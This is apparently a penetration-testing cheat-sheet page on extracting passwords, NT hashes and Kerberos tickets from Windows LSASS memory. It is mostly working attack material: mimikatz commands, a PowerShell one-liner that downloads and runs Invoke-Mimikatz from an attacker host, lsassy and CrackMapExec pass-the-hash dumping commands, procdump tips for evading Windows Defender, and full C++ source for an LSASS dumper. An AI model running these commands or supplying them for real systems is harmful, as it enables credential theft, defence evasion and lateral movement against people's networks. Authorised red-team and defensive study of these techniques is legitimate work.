# LSASS Memory

## Theory

`lsass.exe` is the process responsible for enforcing security policy on Windows systems. When a user attempts to log on to the system, this process verifies their login attempt and creates access tokens based on the user's permission levels. LSASS is also responsible for password changes to user accounts. All events associated with this process (login/logout attempts, etc.) are logged in the Windows security log. LSASS is a valuable target, as there are several tools available to extract both clear text and hashed credentials stored in memory by this process.

From this process, you can extract **NT hashes and passwords**, obtain **Kerberos keys** and retrieve **Kerberos tickets** stored on the machine.

## Practical

{% tabs %}
{% tab title="mimikatz" %}
Extracts NT hashes and passwords. There is also a section called "wdigest", which was a feature of Windows 7 and earlier, where passwords were displayed in plaintext:

```bash
# Local. Extract credentials from lsass.exe:
sekurlsa::logonpasswords
Invoke-Mimikatz -DumpCreds # -DumpCreds = sekurlsa::logonpasswords
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
powershell IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds # In memory.
# Remote. Analyze a memory dump:
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

You can also use a special version of mimikatz called mimilove (Windows 2000 only).
{% endtab %}

{% tab title="lsassy" %}
`lsassy.py` is a tool (part of CrackMapExec) that allows you to extract the credentials of the lsass.exe process remotely. It has several methods of dumping, authentication, usage, etc.:

```bash
# With plaintext credentials
lsassy.py -d <DOMAIN> -u <USER> -H <HASH> <TARGET>

# With Pass-The-Hash:
lsassy.py -u <USER> -H <HASH> <TARGET>

# With Pass The Ticket (remember to export the variable KRB5CCNAME):
lsassy -k <TARGET>

# With the CrackMapExec module:
## If there are logged in users, we can dumpear their hashes with -M lssasy:
crackmapexec smb <TARGET> -u <USER> -p <PASS> [-d <DOMAIN>] --loggedon-users
## With plaintext credentials:
crackmapexec smb <TARGET> -u <USER> -p <PASS> [-d <DOMAIN>] -M lssasy
## With Pass-The-Hash:
crackmapexec smb <TARGET> -d <DOMAIN> -u <USER> -H <HASH> -M lsassy [-o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=passneo4j]
## With Pass-The-Ticket (remember to export the variable KRB5CCNAME):
crackmapexec smb <TARGET> -k -M lsassy [-o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=passneo4j] 
```

### References:

{% embed url="https://en.hackndo.com/remote-lsass-dump-passwords" %}
{% endtab %}

{% tab title="procdump" %}
We can dump the lsass.exe process with the SysInternals [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) tool:

{% hint style="info" %}
It is recommended to indicate the lsass.exe process by its ID/PID. Windows Defender considers downloading lsass to be a suspicious activity. When the dump process finishes, Windows Defender deletes the dump after a few seconds. However, by providing you with the PID of the lsass, Windows Defender no longer complains.
{% endhint %}

```bash
# 1. Get the running lsass.exe process with its ID/PID:
tasklist /fi "imagename eq lsass.exe"
Get-Process | where {$_.ProcessName -like "lsass"} | ft ProcessName, Id
# 2. Dump everything (memory and process) of a given process from its PID/ID or its name:
procdump64.exe /accepteula -ma <ID> <NAME>.dmp # Recommended.
procdump64.exe /accepteula -ma <ProccessName> <NAME>.dmp # Not recommended (not stealthy).
procdump64.exe -accepteula -r -ma <ProccessName> <NAME>.dmp # Avoid reading lsass by dumping a cloned lsass process.
```

Then, to read the dumpeted file, we can use pypykayz or mimikatz.
{% endtab %}

{% tab title="Manual" %}
Suppose we cannot load the tools on the target for whatever reason but we have **RDP access**. In that case, we can do a manual memory dump of the LSASS process through the **Task Manager** by navigating to the **Details tab**, choosing the LSASS process and selecting "**Create dump file**". After downloading this file back to our attack system, we can process it using Mimikatz or pypykatz.

![](../../../.gitbook/assets/LSASS\_Manual.png)
{% endtab %}

{% tab title="pypykatz" %}
Pypykatz (Python) can be used to analyze a memory dump:

```bash
pypykatz lsa minidump <LSASS>.dmp
```
{% endtab %}

{% tab title="MiniDumpWriteDump" %}
Write a simple lsass process dump using the MiniDumpWriteDump API. Dumps of lsass processes created with MiniDumpWriteDump can be uploaded to mimikatz offline, where credential materials could be extracted.

{% hint style="info" %}
Of course, there is Sysinternal's `procdump` which does the same thing and is not flagged by Windows Defender, but it's always good to know that there are alternatives you can turn to if you need it for any reason.
{% endhint %}

{% code title="CreateMiniDump.exe" %}
```cpp
#include "stdafx.h"
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
using namespace std;
int main() {
	DWORD lsassPID = 0;
	HANDLE lsassHandle = NULL; 
	// Open a handle to lsass.dmp - this is where the minidump file will be saved to
	HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	// Find lsass PID	
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";
	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processName, L"lsass.exe") != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			lsassPID = processEntry.th32ProcessID;
		}
		wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
	}
	
	// Open handle to lsass.exe process
	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
	
	// Create minidump
	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	
	if (isDumped) {
		cout << "[+] lsass dumped successfully!" << endl;
	}
	
    return 0;
}
```
{% endcode %}

We run it and then analyze it with mimikatz or pypykatz.
{% endtab %}
{% endtabs %}

The credentials obtained could be plaintext passwords or an NT hash, which can lead to various attacks such as Pass-The-Hash, Overpass-the-Hash, etc.
